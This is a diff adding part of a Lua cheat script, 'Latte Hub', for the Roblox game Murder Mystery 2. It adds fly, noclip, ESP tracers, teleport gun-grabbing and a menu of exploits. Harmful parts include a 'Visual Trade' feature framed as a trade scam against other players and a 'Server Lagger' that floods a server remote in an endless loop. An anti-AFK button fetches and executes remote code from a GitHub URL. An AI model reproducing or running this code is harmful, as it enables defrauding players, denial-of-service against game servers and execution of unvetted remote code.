+                Content = visualTradeEnabled and "Visual Trade Enabled! 🛡️" or "Visual Trade Disabled! 🛡️"
+        })
+    end
+})
+
+    ProtectionTab:Button({
+        Title = "🛡️ Start Visual Trade",
+        Color = PurpleTheme.Error,
+        Icon = "shield",
+        Callback = function()
+        if not visualTradeEnabled then
+                WindUI:Notify({
+                    Title = "❌ Visual Trade Error",
+                    Content = "Please enable Visual Trade first! 🛡️"
+            })
+            return
+        end
+        
+            if game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Enabled == true or game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled == true then
+                task.wait(1)
+                WindUI:Notify({
+                    Title = "🛡️ Trade Scam Active",
+                    Content = "Items In Trade Are Now Visual, Remove All Items! 🛡️"
+                })
+            else
+                WindUI:Notify({
+                    Title = "❌ Trade Scam Error",
+                    Content = "You Need To Be In Trade For This To Work! 🛡️"
+                })
+            end
+    end
+})
+
+    ProtectionTab:Space()
+    
+    -- Anti Stealer Section
+    ProtectionTab:Section({
+        Title = "🔒 Anti Stealer Protection",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    local antiStealerEnabled = false
+    local tradeScamProtectionEnabled = false
+    
+    ProtectionTab:Toggle({
+        Flag = "AntiStealer",
+        Title = "🔒 Enable Anti Stealer",
+        Desc = "Enable anti-stealer protection",
+    Default = false,
+        Callback = function(state)
+            antiStealerEnabled = state
+            WindUI:Notify({
+                Title = "🔒 Anti Stealer",
+                Content = state and "Script protection is now active! 🔒" or "Script protection has been turned off! 🔒"
+            })
+    end
+})
+
+    ProtectionTab:Toggle({
+        Flag = "TradeScamProtection",
+        Title = "🛡️ Trade Scam Protection",
+        Desc = "Protect against trade scams",
+    Default = false,
+        Callback = function(state)
+            tradeScamProtectionEnabled = state
+            WindUI:Notify({
+                Title = "🛡️ Trade Scam Protection",
+                Content = state and "You are now protected against trade scams! 🛡️" or "Trade scam protection has been turned off! 🛡️"
+            })
+    end
+})
+
+    ProtectionTab:Space()
+    
+    -- Server Lagger Section
+    ProtectionTab:Section({
+        Title = "⚡ Server Lagger",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    ProtectionTab:Button({
+        Title = "⚡ Start Server Lag",
+        Color = PurpleTheme.Error,
+        Icon = "zap",
+        Callback = function()
+            WindUI:Notify({
+                Title = "⚡ Server Lagger",
+                Content = "Server Is Now In Lagging, There Is A Chance To Be Disconnected! ⚡"
+        })
+        
+        local success = pcall(function()
+            local e = game:GetService("ReplicatedStorage").GetSyncData
+            local InvokeServer = e.InvokeServer
+            local spawn = task.spawn
+            local a = 0;
+            while 1 do
+                for i=1, 1 do
+                    spawn(InvokeServer, e)
+                end
+                a = a + 1
+                if a == 3 then
+                    a = 0
+                        task.wait(0)
+                end
+            end
+        end)
+        
+        if not success then
+                WindUI:Notify({
+                    Title = "❌ Server Lagger Error",
+                    Content = "Failed to start server lag! ⚡"
+            })
+        end
+    end
+})
+
+    ProtectionTab:Space()
+    
+    -- Anti AFK Section
+    ProtectionTab:Section({
+        Title = "🌙 Anti AFK Protection",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    ProtectionTab:Button({
+        Title = "🌙 Enable Anti AFK",
+        Color = PurpleTheme.Primary,
+        Icon = "moon",
+        Callback = function()
+        local success = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
+        end)
+        
+        if success then
+                WindUI:Notify({
+                    Title = "🌙 Anti AFK",
+                    Content = "Anti AFK script executed successfully! 🌙"
+            })
+        else
+                WindUI:Notify({
+                    Title = "❌ Anti AFK Error",
+                    Content = "Failed to load Anti AFK script! 🌙"
+            })
+        end
+    end
+})
+
+    ProtectionTab:Section({
+        Title = "ℹ️ About Anti AFK",
+        TextSize = isMobile and 12 or 14,
+        TextTransparency = 0.3,
+    })
+    
+    ProtectionTab:Section({
+        Title = "This feature prevents you from being kicked for inactivity. Click the button above to activate anti-AFK protection.",
+        TextSize = isMobile and 10 or 12,
+        TextTransparency = 0.5,
+    })
+end
+
+-- */  Advanced Tab  /* --
+do
+    -- Advanced Features Section
+    AdvancedTab:Section({
+        Title = "⚡ Advanced Features",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    local flyEnabled = false
+    local flySpeed = 50
+    local noclipEnabled = false
+    local rainbowCharacter = false
+    local screenShake = false
+    local particleEffects = false
+    local currentGravity = 196.2
+    
+    AdvancedTab:Toggle({
+        Flag = "FlyMode",
+        Title = "✈️ Fly Mode",
+        Desc = "Enable fly mode (WASD + Space/Shift)",
+        Default = false,
+        Callback = function(state)
+            flyEnabled = state
+            WindUI:Notify({
+                Title = "✈️ Fly Mode",
+                Content = state and "Fly mode enabled! Use WASD to move! ✈️" or "Fly mode disabled! ✈️"
+            })
+        end
+    })
+
+    AdvancedTab:Slider({
+        Flag = "FlySpeed",
+        Title = "🚀 Fly Speed",
+        Desc = "Set fly speed",
+        Step = 1,
+        Value = {
+            Min = 10,
+            Max = 200,
+            Default = 50,
+        },
+        Callback = function(value)
+            flySpeed = value
+        end
+    })
+
+    AdvancedTab:Toggle({
+        Flag = "Noclip",
+        Title = "👻 Noclip",
+        Desc = "Walk through walls",
+        Default = false,
+        Callback = function(state)
+            noclipEnabled = state
+            WindUI:Notify({
+                Title = "👻 Noclip",
+                Content = state and "Noclip enabled! 👻" or "Noclip disabled! 👻"
+            })
+        end
+    })
+
+    AdvancedTab:Toggle({
+        Flag = "RainbowCharacter",
+        Title = "🌈 Rainbow Character",
+        Desc = "Make your character cycle through rainbow colors",
+        Default = false,
+        Callback = function(state)
+            rainbowCharacter = state
+            WindUI:Notify({
+                Title = "🌈 Rainbow Character",
+                Content = state and "Rainbow character enabled! 🌈" or "Rainbow character disabled! 🌈"
+            })
+        end
+    })
+
+    AdvancedTab:Slider({
+        Flag = "CharacterSize",
+        Title = "📏 Character Size",
+        Desc = "Change your character's size",
+        Step = 0.1,
+        Value = {
+            Min = 0.1,
+            Max = 5,
+            Default = 1,
+        },
+        Callback = function(value)
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.HipHeight = value
+                LocalPlayer.Character.Humanoid.WalkSpeed = 16 * value
+                WindUI:Notify({
+                    Title = "📏 Size Changer",
+                    Content = "Character size set to " .. value .. "! 📏"
+                })
+            end
+        end
+    })
+
+    AdvancedTab:Slider({
+        Flag = "Gravity",
+        Title = "🌍 Gravity",
+        Desc = "Change world gravity",
+        Step = 1,
+        Value = {
+            Min = 0,
+            Max = 500,
+            Default = 196,
+        },
+        Callback = function(value)
+            currentGravity = value
+            workspace.Gravity = value
+            WindUI:Notify({
+                Title = "🌍 Gravity Changer",
+                Content = "Gravity set to " .. value .. "! 🌍"
+            })
+        end
+    })
+
+    AdvancedTab:Button({
+        Title = "🔄 Reset Gravity",
+        Color = PurpleTheme.Primary,
+        Icon = "refresh-cw",
+        Callback = function()
+            workspace.Gravity = 196.2
+            WindUI:Notify({
+                Title = "🔄 Gravity Reset",
+                Content = "Gravity reset to normal! 🌍"
+            })
+        end
+    })
+
+    AdvancedTab:Toggle({
+        Flag = "ScreenShake",
+        Title = "📳 Screen Shake",
+        Desc = "Add screen shake effects",
+        Default = false,
+        Callback = function(state)
+            screenShake = state
+            WindUI:Notify({
+                Title = "📳 Screen Shake",
+                Content = state and "Screen shake enabled! 📳" or "Screen shake disabled! 📳"
+            })
+        end
+    })
+
+    AdvancedTab:Button({
+        Title = "💥 Explode Everyone",
+        Color = PurpleTheme.Error,
+        Icon = "zap",
+        Callback = function()
+            WindUI:Notify({
+                Title = "💥 Explosion",
+                Content = "Creating explosions around all players! 💥"
+            })
+        
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                    local explosion = Instance.new("Explosion")
+                    explosion.Position = player.Character.HumanoidRootPart.Position
+                    explosion.BlastRadius = 50
+                    explosion.BlastPressure = 1000000
+                    explosion.Parent = workspace
+                end
+            end
+        end
+    })
+end
+
+-- Advanced Features Implementation
+local flyBodyVelocity = nil
+local flyBodyPosition = nil
+
+local function startFly()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+    
+    local rootPart = LocalPlayer.Character.HumanoidRootPart
+    
+    flyBodyVelocity = Instance.new("BodyVelocity")
+    flyBodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
+    flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
+    flyBodyVelocity.Parent = rootPart
+    
+    flyBodyPosition = Instance.new("BodyPosition")
+    flyBodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
+    flyBodyPosition.Position = rootPart.Position
+    flyBodyPosition.Parent = rootPart
+end
+
+local function stopFly()
+    if flyBodyVelocity then
+        flyBodyVelocity:Destroy()
+        flyBodyVelocity = nil
+    end
+    if flyBodyPosition then
+        flyBodyPosition:Destroy()
+        flyBodyPosition = nil
+    end
+end
+
+-- Fly Controls
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed or not flyEnabled then return end
+    
+    local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not rootPart or not flyBodyVelocity then return end
+    
+    local camera = workspace.CurrentCamera
+    local moveVector = Vector3.new(0, 0, 0)
+    
+    if input.KeyCode == Enum.KeyCode.W then
+        moveVector = moveVector + camera.CFrame.LookVector
+    elseif input.KeyCode == Enum.KeyCode.S then
+        moveVector = moveVector - camera.CFrame.LookVector
+    elseif input.KeyCode == Enum.KeyCode.A then
+        moveVector = moveVector - camera.CFrame.RightVector
+    elseif input.KeyCode == Enum.KeyCode.D then
+        moveVector = moveVector + camera.CFrame.RightVector
+    elseif input.KeyCode == Enum.KeyCode.Space then
+        moveVector = moveVector + Vector3.new(0, 1, 0)
+    elseif input.KeyCode == Enum.KeyCode.LeftShift then
+        moveVector = moveVector - Vector3.new(0, 1, 0)
+    end
+    
+    flyBodyVelocity.Velocity = moveVector * flySpeed
+end)
+
+-- Noclip System
+local function noclipLoop()
+    if noclipEnabled and LocalPlayer.Character then
+        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.CanCollide = false
+            end
+        end
+    end
+end
+
+-- Rainbow Character
+local function rainbowCharacterLoop()
+    if rainbowCharacter and LocalPlayer.Character then
+        local hue = tick() % 10 / 10
+        local color = Color3.fromHSV(hue, 1, 1)
+        
+        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
+            if part:IsA("BasePart") and part:FindFirstChild("Color") then
+                part.Color = color
+            end
+        end
+    end
+end
+
+-- Screen Shake Effect
+local function screenShakeLoop()
+    if screenShake and workspace.CurrentCamera then
+        local camera = workspace.CurrentCamera
+        local shake = math.sin(tick() * 20) * 2
+        camera.CFrame = camera.CFrame * CFrame.new(shake, shake, 0)
+    end
+end
+
+-- Role-specific Functions (Innocent, Murder, Sheriff)
+local GunSystem = {
+    AutoGrabEnabled = false,
+    NotifyGunDrop = true,
+    GunDropCheckInterval = 1,
+    ActiveGunDrops = {},
+    GunDropHighlights = {}
+}
+
+local mapPaths = {
+    "ResearchFacility", "Hospital3", "MilBase", "House2", "Workplace",
+    "Mansion2", "BioLab", "Hotel", "Factory", "Bank2", "PoliceStation"
+}
+
+local function ScanForGunDrops()
+    GunSystem.ActiveGunDrops = {};
+    for _, mapName in ipairs(mapPaths) do
+        local map = workspace:FindFirstChild(mapName);
+        if map then
+            local gunDrop = map:FindFirstChild("GunDrop");
+            if gunDrop then
+                table.insert(GunSystem.ActiveGunDrops, gunDrop);
+            end
+        end
+    end
+    local rootGunDrop = workspace:FindFirstChild("GunDrop");
+    if rootGunDrop then
+        table.insert(GunSystem.ActiveGunDrops, rootGunDrop);
+                    end
+                end
+                
+local function GrabGun(gunDrop)
+    if not gunDrop then
+        ScanForGunDrops();
+        if #GunSystem.ActiveGunDrops == 0 then
+            WindUI:Notify({
+                Title = "Gun System",
+                Content = "No guns available on the map! 🔫"
+            });
+            return false;
+        end
+        local nearestGun = nil;
+        local minDistance = math.huge;
+        local character = LocalPlayer.Character;
+        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart");
+        if humanoidRootPart then
+            for _, drop in ipairs(GunSystem.ActiveGunDrops) do
+                local distance = (humanoidRootPart.Position - drop.Position).Magnitude;
+                if distance < minDistance then
+                    nearestGun = drop;
+                    minDistance = distance;
+                    end
+                end
+            end
+        gunDrop = nearestGun;
+    end
+    if (gunDrop and LocalPlayer.Character) then
+        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
+        if humanoidRootPart then
+            humanoidRootPart.CFrame = gunDrop.CFrame;
+            task.wait(0.3);
+            local prompt = gunDrop:FindFirstChildOfClass("ProximityPrompt");
+            if prompt then
+                fireproximityprompt(prompt);
+                WindUI:Notify({
+                    Title = "Gun System",
+                    Content = "Successfully grabbed the gun! 🔫"
+                });
+                return true;
+            end
+        end
+    end
+    return false;
+end
+
+-- Main Loop
+RunService.Heartbeat:Connect(function()
+    -- Fly system
+    if flyEnabled then
+        if not flyBodyVelocity then
+            startFly()
+        end
+    else
+        if flyBodyVelocity then
+            stopFly()
+        end
+    end
+    
+    -- Noclip
+    noclipLoop()
+    
+    -- Rainbow character
+    rainbowCharacterLoop()
+    
+    -- Screen shake
+    screenShakeLoop()
+    
+    -- Update character settings
+    updateCharacter()
+    
+    -- Auto collect
+    autoCollectLoop()
+end)
+
+-- Connect ESP updates
+RunService.RenderStepped:Connect(function()
+    if not lineESPEnabled then return end
+    for player, line in pairs(tracers) do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+            local rootGuiSize = workspace.CurrentCamera.ViewportSize
+            if onScreen then
+                line.From = Vector2.new(rootGuiSize.X / 2, rootGuiSize.Y)
+                line.To = Vector2.new(screenPos.X, screenPos.Y)
+                line.Visible = true
+            else
+                line.Visible = false
+            end
+        else
+            line.Visible = false
+        end
+    end
+end)
+
+-- Monitor player changes for ESP
+local function monitorPlayer(player)
+    player.CharacterAdded:Connect(function()
+        local backpack = player:WaitForChild("Backpack")
+        backpack.ChildAdded:Connect(updateESP)
+        backpack.ChildRemoved:Connect(updateESP)
+        updateESP()
+    end)
+
+    if player.Character then
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            backpack.ChildAdded:Connect(updateESP)
+            backpack.ChildRemoved:Connect(updateESP)
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do monitorPlayer(player) end
+Players.PlayerAdded:Connect(monitorPlayer)
+
+-- Player removal handling
+Players.PlayerRemoving:Connect(function(player)
+    if player == LocalPlayer then
+        for _, line in pairs(tracers) do
+            if line then line:Remove() end
+        end
+        tracers = {}
+    end
+end)
+
+-- Initialize ESP
+updateESP()
+
+-- Config setup
+local ConfigManager = Window.ConfigManager
+local ConfigName = "latte_config"
+
+-- Save config
+Window.CurrentConfig = ConfigManager:CreateConfig(ConfigName)
+Window.CurrentConfig:Save()
+
+WindUI:Notify({
+    Title = "Latte Hub Loaded!",
+    Content = "Welcome to the Halloween edition! Murder Mystery 2 Halloween Update!",
+    Time = 5
+})
